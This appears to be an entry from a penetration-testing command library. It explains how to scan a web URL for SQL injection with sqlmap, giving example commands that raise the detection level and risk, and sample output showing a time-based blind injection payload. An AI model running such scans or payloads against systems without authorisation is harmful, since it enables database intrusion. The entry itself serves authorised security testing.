---
type: command
executor: bash
data: 'sqlmap -u "http://$_TARGET_URL" --batch'
output: null
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - sqli
  - web
  - exploitation
verified: true
validated: true
---

# sqlmap-scan-url-for-injection

## Command

```bash
sqlmap -u "http://$_TARGET_URL" --batch
```

## Description

This command uses SQLMap to scan a specified URL for SQL injection vulnerabilities in its parameters. It automates payload injection to detect flaws like time-based or union-based SQLi, identifying the backend DBMS and logging results for further analysis. Use it during web application penetration testing to quickly assess dynamic endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The full target URL including the injectable parameter (e.g., http://example.com/search?term=test) | Yes |
| -u | URL to test for injection points | Built-in |
| --batch | Runs in non-interactive mode, auto-answering prompts with defaults | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://192.168.1.100/search?term=test" --batch
```

### Advanced Usage

```bash
sqlmap -u "http://example.com/page?id=1" --batch --level=3 --risk=2
```

This increases detection thoroughness by testing more payloads and injection contexts.

## Expected Output

SQLMap displays its banner followed by detection progress. Successful vulnerability detection includes:

```
[*] starting at HH:MM:SS

[INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=' AND SLEEP(5) AND '='
---
[INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP
back-end DBMS: MySQL >= 5.0.12
[INFO] fetched data logged to text files under '/root/.sqlmap/output/'

[*] shutting down at HH:MM:SS
```

Look for warnings on empty parameters and confirm injection types. If no vulnerabilities, output states "no injectable points found."

## Related

- [[procedures/Detect-SQL-Injection-Vulnerability-with-SQLMap]]
- [[tools/sqlmap]]
